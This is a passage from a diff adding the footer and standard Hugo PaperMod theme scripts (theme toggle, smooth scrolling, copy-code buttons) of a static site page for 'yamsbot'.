+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://yams.bot/">🍠 yamsbot</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
